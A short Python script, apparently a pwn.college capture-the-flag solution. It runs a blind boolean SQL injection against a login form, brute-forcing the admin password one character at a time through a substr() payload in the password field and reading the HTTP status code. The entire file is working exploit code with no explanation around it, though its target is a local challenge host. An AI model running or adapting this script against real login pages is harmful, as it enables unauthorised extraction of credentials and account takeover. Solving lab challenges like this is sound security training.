import os 
import string 
import requests 

chars = string.printable
pass_str = "' OR substr(password,{pos},1) = '{char}'  --"

def guess_a_char(payload, pos):
    for char in chars:
        payload["password"] = pass_str.format(pos=pos, char=char)
        req = requests.post("http://challenge.localhost/", data=payload)

        if (req.status_code < 400):
            return char


password = "pwn.college{"
boiler_len = len(password)

payload = {"username": "admin", "password": ""}

for i in range(100):
    char = guess_a_char(payload, i + boiler_len)
    if char is None:
        break

    password += char

print(password)
